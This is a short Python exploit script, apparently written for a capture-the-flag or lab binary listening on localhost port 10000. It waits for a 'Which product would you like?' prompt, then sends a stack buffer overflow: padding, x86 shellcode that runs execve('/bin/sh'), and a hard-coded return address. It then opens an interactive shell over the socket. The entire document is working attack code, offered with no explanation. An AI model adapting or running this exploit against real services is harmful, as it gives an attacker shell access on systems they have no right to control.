import socket
import telnetlib
import sys
import struct

def read_until(sock, s):
    line = b""
    while line.find(s) < 0:
        line += sock.recv(1)
    return line


host = "localhost"
port = 10000

target_addr = int(0xffffd410)
print("%x" % (target_addr))
target_addr = struct.pack("<L", target_addr)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
print(host)
print(port)
sock.connect((host, port))

ret = read_until(sock, b"Which product would you like?\n")
print(ret)

shellcode_sh = b"\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xd2\x52\x53\x89\xe1\xb8\x0b\x00\x00\x00\xcd\x80"

sock.sendall(b"A" * 20 + shellcode_sh + b"B" * 35 + target_addr)

t = telnetlib.Telnet()
t.sock = sock
t.interact()
